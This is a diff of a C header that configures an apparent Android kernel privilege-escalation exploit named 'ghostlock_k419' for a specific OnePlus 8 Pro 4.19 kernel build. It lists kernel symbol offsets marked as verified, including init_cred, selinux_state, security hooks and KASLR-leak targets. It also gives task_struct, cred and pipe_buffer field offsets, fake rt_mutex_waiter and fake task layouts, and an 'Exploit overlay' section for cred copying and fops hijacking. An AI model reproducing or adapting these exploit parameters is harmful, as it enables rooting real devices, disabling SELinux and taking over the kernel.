@@ -1,185 +1,153 @@
 #ifndef TARGET_H
 #define TARGET_H
+/* VERIFIED against: OnePlus 8 Pro, RKQ1.211119.001/Q.204faf2-2-7cfdc8,
+   4.19.157-perf+ #1 SMP PREEMPT Sat Oct 11 17:02:28 CST 2025.
+   Method: llvm-objdump immediates + kallsyms cross-check. */
 
 #define BUILD_VARIANT_LABEL "ghostlock_k419"
 #define BUILD_FINGERPRINT "oneplus/ghostlock_msm419"
 
-/* Kernel address space — 4.19 arm64 Android (VA_BITS=39) */
+/* Kernel VA base: offsets below are relative to 0xffffff8008000000
+   (= _text 0xffffff8008080000 MINUS the 0x80000 arm64 TEXT_OFFSET). */
 #define KIMAGE_TEXT_BASE 0xffffff8008000000ULL
-#define P0_PAGE_OFFSET 0xffffff8000000000ULL
-#define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0  /* unknown, resolved at runtime via kallsyms */
 
-/* Direct map / physmap range */
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END   0xffffffc000000000ULL
-#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END 0xffffffc000000000ULL
-#define VMEMMAP_START 0xfffffffe00000000ULL
-
-/* Global symbol offsets (kallsyms extracted from kernel.elf) */
-#define INIT_TASK_OFF          0x0281C9C0ULL
-#define INIT_CRED_OFF          0x0282CAA8ULL  /* resolved via kallsyms_lookup_name */
-#define INIT_UTS_NS_OFF        0x0281C768ULL
-#define EMPTY_ZERO_PAGE_OFF    0x02B83000ULL
-#define ROOT_TASK_GROUP_OFF    0x02B89E40ULL
-#define SELINUX_ENFORCING_OFF  0x034DC000ULL  /* selinux_state */
-#define KPTR_RESTRICT_OFF      0ULL  /* resolved via kallsyms_lookup_name */
-#define CAP_CAPABLE_ACTIVE_OFF 0ULL  /* resolved via kallsyms_lookup_name */
-#define KPTR_RESTRICT          0ULL
-
-#define SELINUX_BLOB_SIZES_OFF  0ULL
-#define SECURITY_HOOK_HEADS_OFF 0x0236FF20ULL
-#define KMALLOC_CACHES_OFF      0x0236FA20ULL
-#define ANON_PIPE_BUF_OPS_OFF   0x01B6D800ULL
-
-/* UMH root: OnePlus seems to have the Usermode Helper the original 4.19 kernel lacks of. */
-#define SYSTEM_UNBOUND_WQ_OFF           0x280DB88ULL
+/* ---- KASLR-relative symbols (kallsyms-validated) ---- */
+#define INIT_TASK_OFF                     0x0281C9C0ULL
+#define INIT_CRED_OFF                     0x0282CAA8ULL
+#define INIT_UTS_NS_OFF                   0x0281C768ULL
+#define EMPTY_ZERO_PAGE_OFF               0x02B83000ULL
+#define ROOT_TASK_GROUP_OFF               0x02B89E40ULL
+#define SELINUX_ENFORCING_OFF             0x034DC000ULL
+#define SECURITY_HOOK_HEADS_OFF           0x0236FF20ULL
+#define KMALLOC_CACHES_OFF                0x0236FA20ULL
+#define ANON_PIPE_BUF_OPS_OFF             0x01B6D800ULL
+#define SYSTEM_UNBOUND_WQ_OFF             0x0280DB88ULL
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000E01B8ULL
+#define ASHMEM_FOPS_OFF                   0x01CCEF68ULL
 
-/* Ashmem (Android shared memory) */
-#define ASHMEM_MISC_FOPS_OFF       0x29C83A0ULL
-#define ASHMEM_FOPS_OFF            0x01CCEF68ULL
-#define ASHMEM_IOCTL_OFF           0x00F46580ULL
-#define ASHMEM_COMPAT_IOCTL_OFF    0ULL
-#define ASHMEM_MMAP_OFF            0x00F46F00ULL
-#define ASHMEM_OPEN_OFF            0x00F47068ULL
-#define ASHMEM_RELEASE_OFF         0x00F470E0ULL
-#define ASHMEM_SHOW_FDINFO_OFF     0x00F471F8ULL
-
-/* Configfs — not available in 4.19 Android kernel */
-#define CONFIGFS_READ_ITER_OFF      0ULL
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0ULL
-#define COPY_SPLICE_READ_OFF        0x00321650ULL
-#define NOOP_LLSEEK_OFF             0x002DF268ULL
-
-/* KASLR leak */
+/* ASHMEM_MISC_FOPS_OFF 0x29C83A0 was stale. &ashmem_misc = 0x02A483A0 (+0x10 = fops slot). */
+#define COPY_SPLICE_READ_OFF          0x00321650ULL
+#define NOOP_LLSEEK_OFF               0x002DF268ULL
 #define SLIDE_NFULNL_LOGGER_OFF       0x02812690ULL
-#define SLIDE_LOGGERS_0_1_OFF         0x028125C8ULL  /* resolved via kallsyms */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02DCE80CULL  /* resolved via kallsyms */
-#define SLIDE_SYSCTL_BOOTID_OFF       0x02DCE80CULL  /* resolved via kallsyms */
+#define SLIDE_LOGGERS_0_1_OFF         0x028125C8ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02DCE80CULL
+#define SLIDE_SYSCTL_BOOTID_OFF       0x02DCE80CULL
 
-/* Derived macros */
-#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
-#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)  /* 0 = runtime resolve */
-#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
-#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
-#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
-#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
-#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
-#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
-#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
-#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
-#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
-#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
-#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
-#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
-#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
-#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
-#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
-#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
-#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
-#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
-#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
-#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
-#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
-#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
-#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
-#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
-#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
-#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+/* ---- task_struct (all measured in disassembly) ---- */
+#define TASK_THREAD_INFO_FLAGS_OFF 0x000
+#define TASK_PREEMPT_COUNT_OFF     0x050
+#define TASK_USAGE_OFF             0x068
+#define TASK_FLAGS_OFF             0x06C
+#define TASK_TASK_CPU_OFF          0x094
+#define TASK_ON_RQ_OFF             0x0B8
+#define TASK_PRIO_OFF              0x0BC
+#define TASK_STATIC_PRIO_OFF       0x0C0
+#define TASK_NORMAL_PRIO_OFF       0x0C4
+#define TASK_SCHED_CLASS_OFF       0x0D0
+#define TASK_SE_OFF                0x100
+#define TASK_SCHED_TASK_GROUP_OFF  0x3C0
+#define TASK_TASKS_OFF             0x530
+#define TASK_EXIT_CODE_OFF         0x5D4
+#define TASK_EXIT_SIGNAL_OFF       0x5D8
+#define TASK_PID_OFF               0x630
+#define TASK_TGID_OFF              0x634
+#define TASK_REAL_PARENT_OFF       0x640
+#define TASK_CHILDREN_OFF          0x650
+#define TASK_SIBLING_OFF           0x660
+#define TASK_GROUP_LEADER_OFF      0x670
+#define TASK_MM_OFF                0x580
+#define TASK_SIGNAL_OFF            0x830
+#define TASK_REAL_CRED_OFF         0x7D8
+#define TASK_CRED_OFF              0x7E0
+#define TASK_COMM_OFF              0x7E8
+#define TASK_SECCOMP_OFF           0x8A0
+#define TASK_ALLOC_LOCK_OFF        0x8C0
+#define TASK_PI_LOCK_OFF           0x8C4
+#define TASK_PI_WAITERS_OFF        0x8D0
+#define TASK_PI_TOP_TASK_OFF       0x8E0
+#define TASK_PI_BLOCKED_ON_OFF     0x8E8
 
-#define PSELECT_WAITER_WORD_SHIFT 0
+/* TASK_ATOMIC_FLAGS: exists (PFA_NO_NEW_PRIVS = bit 0) but offset unverified on this
+   build — never located. Do not write 0x598. */
 
-/* rt_mutex_waiter struct offsets for 4.19 arm64:
- * tree_entry: 0x00-0x17 (3x8 = 24 bytes: __rb_parent_color, rb_right, rb_left)
- * pi_tree_entry: 0x18-0x2F (24 bytes)
- * task: 0x30
- * lock: 0x38
- * prio: 0x40
- * ww_ctx: 0x48 */
-#define WAITER_LOCAL_OFF          0x80
+/* ---- mm_struct ---- */
+#define MM_USERS_OFF 0x050
+#define MM_OWNER_OFF 0x330
+
+/* ---- cred (vanilla 4.19 layout — see stamp below before trusting) ---- */
+#define CRED_USAGE_OFF           0x00
+#define CRED_UID_BLOCK_OFF       0x04
+#define CRED_SECUREBITS_OFF      0x24
+#define CRED_CAP_INHERITABLE_OFF 0x28
+#define CRED_CAP_PERMITTED_OFF   0x30
+#define CRED_CAP_EFFECTIVE_OFF   0x38
+#define CRED_CAP_BSET_OFF        0x40
+#define CRED_CAP_AMBIENT_OFF     0x48
+#define CRED_SECURITY_OFF        0x78
+#define CRED_USER_OFF            0x80
+#define CRED_USER_NS_OFF         0x88
+#define CRED_GROUP_INFO_OFF      0x90
+#define SELINUX_CRED_OSID_OFF    0x00
+#define SELINUX_CRED_SID_OFF     0x04
+
+/* ---- file_operations (vanilla 4.19 — header's early entries were +8-shifted) ---- */
+#define FOPS_OWNER_OFF        0x00
+#define FOPS_LLSEEK_OFF       0x08
+#define FOPS_READ_OFF         0x10
+#define FOPS_WRITE_OFF        0x18
+#define FOPS_READ_ITER_OFF    0x20
+#define FOPS_WRITE_ITER_OFF   0x28
+#define FOPS_POLL_OFF         0x40
+#define FOPS_IOCTL_OFF        0x48
+#define FOPS_COMPAT_IOCTL_OFF 0x50
+#define FOPS_MMAP_OFF         0x58
+#define FOPS_OPEN_OFF         0x68
+#define FOPS_RELEASE_OFF      0x78
+#define FOPS_SPLICE_WRITE_OFF 0xB8
+#define FOPS_SPLICE_READ_OFF  0xC0
+#define FOPS_SHOW_FDINFO_OFF  0xD8
+
+/* ---- pipe_buf_operations (4.19) ---- */
+#define PBUF_CAN_MERGE_OFF 0x00
+#define PBUF_CONFIRM_OFF   0x08
+#define PBUF_RELEASE_OFF   0x10
+#define PBUF_STEAL_OFF     0x18
+#define PBUF_GET_OFF       0x20
+
+/* ---- page / slab ---- */
+#define STRUCT_PAGE_SIZE              0x40
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
+#define STRUCT_PAGE_SLAB_CACHE_OFF    0x18
+#define STRUCT_PAGE_TYPE_OFF          0x30
+
+/* ---- rt_mutex_waiter (kernel struct; task/lock/prio measured-adjacent, vanilla) ---- */
 #define WAITER_TREE_ENTRY_OFF     0x00
 #define WAITER_PI_TREE_ENTRY_OFF  0x18
 #define WAITER_TASK_OFF           0x30
 #define WAITER_LOCK_OFF           0x38
-#define WAITER_WAKE_STATE_OFF     0x50
 #define WAITER_PRIO_OFF           0x40
-#define WAITER_DEADLINE_OFF       0x44
-#define WAITER_WW_CTX_OFF         0x48
+/* deadline/ww_ctx/wake_state: unverified — only needed for DL-pi paths */
 
-#define FAKE_WAITER_TREE_PRIO_OFF         0x18
-#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x18
-#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x30
-#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x38
-#define FAKE_WAITER_TASK_OFF              0x30
-#define FAKE_WAITER_LOCK_OFF              0x38
-#define FAKE_WAITER_WAKE_STATE_OFF        0x50
-#define FAKE_WAITER_WW_CTX_OFF            0x48
-
-/* verified offsets — OnePlus 8 Pro, RKQ1.211119.001, 4.19.157-perf+ Oct 11 2025 */
-#define FAKE_TASK_USAGE_OFF          0x68
-#define FAKE_TASK_PRIO_OFF           0xBC
-#define FAKE_TASK_NORMAL_PRIO_OFF    0xC4
-#define FAKE_TASK_TASK_GROUP_OFF     0x418
-#define FAKE_TASK_PI_LOCK_OFF        0x8C4
-#define FAKE_TASK_PI_WAITERS_OFF     0x8D0
-#define FAKE_TASK_PI_TOP_TASK_OFF    0x8E0
-#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x8E8
-
-#define MM_OWNER_OFF               0x330   /* mm_struct */
-#define TASK_PID_OFF               0x5D4   /* pending — verify with gettid */
-#define TASK_TGID_OFF              0x5D8
-#define TASK_REAL_PARENT_OFF       0x640
-#define TASK_REAL_CRED_OFF         0x7D8
-#define TASK_CRED_OFF              0x7E0
-#define TASK_COMM_OFF              0x7E8
-#define TASK_TASKS_OFF             0x530
-#define TASK_THREAD_INFO_FLAGS_OFF 0x00
-#define TASK_SECCOMP_OFF           0x8A0   /* filter at +0x8A8 */
-#define TASK_MM_OFF                0x580
-#define TASK_ALLOC_LOCK_OFF        0x8C0
-#define TASK_FLAGS_OFF             0x6C
-
-/* cred struct offsets (same across versions) */
-#define CRED_UID_OFF         8
-#define CRED_SECUREBITS_OFF  40
-#define CRED_CAPS_OFF        48
-#define CRED_SECURITY_OFF    128
-#define SELINUX_CRED_BLOB_OFF  0
-#define SELINUX_CRED_OSID_OFF  0
-#define SELINUX_CRED_SID_OFF   4
-#define SECCOMP_MODE_OFF          0x00
-#define SECCOMP_FILTER_COUNT_OFF  0x04
-#define SECCOMP_FILTER_OFF        0x08
-#define TIF_SECCOMP_BIT           11
-#define PFA_NO_NEW_PRIVS_BIT      0
-
-/* Page/slab struct offsets */
-#define STRUCT_PAGE_SIZE              0x40
-#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
-#define STRUCT_SLAB_CACHE_OFF         0x08
-#define STRUCT_PAGE_TYPE_OFF          0x30
-
-/* Pipe struct offsets */
-#define PIPE_BUFFER_SIZE         0x28
-#define PIPE_BUFFER_SLOTS        32
-#define PIPE_BUF_FLAG_CAN_MERGE  0x10
-#define PIPE_INODE_INFO_STRUCT_SIZE   0xB8
-#define PIPE_INODE_INFO_SIZE          0xC0
+/* ---- pipe_inode_info: UNVERIFIED on this build (vendor surface) ----
+   PIPE_BUFFER_SIZE 0x28 is vanilla-solid; PIPE_BUFFER_SLOTS 32 vs vanilla 16 —
+   confirm at runtime: pipe(); fcntl(F_GETPIPE_SZ) returns the default ring size. */
+#define PIPE_BUFFER_SIZE               0x28
+#define PIPE_BUFFER_SLOTS              32
+#define PIPE_BUF_FLAG_CAN_MERGE        0x10
+#define PIPE_INODE_INFO_STRUCT_SIZE    0xB8
+#define PIPE_INODE_INFO_SIZE           0xC0
 #define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
-#define PIPE_HEAD_OFF                 0x60
-#define PIPE_TAIL_OFF                 0x64
-#define PIPE_MAX_USAGE_OFF            0x68
-#define PIPE_RING_SIZE_OFF            0x6C
-#define PIPE_NR_ACCOUNTED_OFF         0x70
-#define PIPE_READERS_OFF              0x74
-#define PIPE_WRITERS_OFF              0x78
-#define PIPE_FILES_OFF                0x7C
-#define PIPE_TMP_PAGE_OFF             0x90
-#define PIPE_BUFS_OFF                 0xA8
-#define PIPE_USER_OFF                 0xB0
+#define PIPE_HEAD_OFF                  0x60
+#define PIPE_TAIL_OFF                  0x64
+#define PIPE_MAX_USAGE_OFF             0x68
+#define PIPE_RING_SIZE_OFF             0x6C
+#define PIPE_NR_ACCOUNTED_OFF          0x70
+#define PIPE_READERS_OFF               0x74
+#define PIPE_WRITERS_OFF               0x78
+#define PIPE_FILES_OFF                 0x7C
+#define PIPE_TMP_PAGE_OFF              0x90
+#define PIPE_BUFS_OFF                  0xA8
+#define PIPE_USER_OFF                  0xB0
 
 /* file_operations offsets */
 #define FOPS_OWNER_OFF        0x00
@@ -197,19 +165,19 @@
 #define FOPS_SHOW_FDINFO_OFF  0xD8
 
 /* Exploit overlay offsets */
-#define LOCK_OFF      0x0E80
-#define W0_OFF        0x1180
-#define FOPS_OFF      0x0F80
-#define SCRATCH_OFF   0x1200
-#define RIGHT_OFF     0x1240
-#define LEFT_OFF      0x1260
-#define FAKE_TASK_OFF 0x1280
+#define LOCK_OFF                0x0E80
+#define W0_OFF                  0x1180
+#define FOPS_OFF                0x0F80
+#define SCRATCH_OFF             0x1200
+#define RIGHT_OFF               0x1240
+#define LEFT_OFF                0x1260
+#define FAKE_TASK_OFF           0x1280
 #define CFG_PAGE_OFF            16
 #define CFG_NEEDS_READ_FILL_OFF 80
 #define CFG_BIN_BUFFER_OFF      88
 #define CFG_BIN_BUFFER_SIZE_OFF 96
 #define CFG_CB_MAX_SIZE_OFF     100
-#define CRED_COPY_OFF 0x1080
+#define CRED_COPY_OFF           0x1080
 
 #endif
 
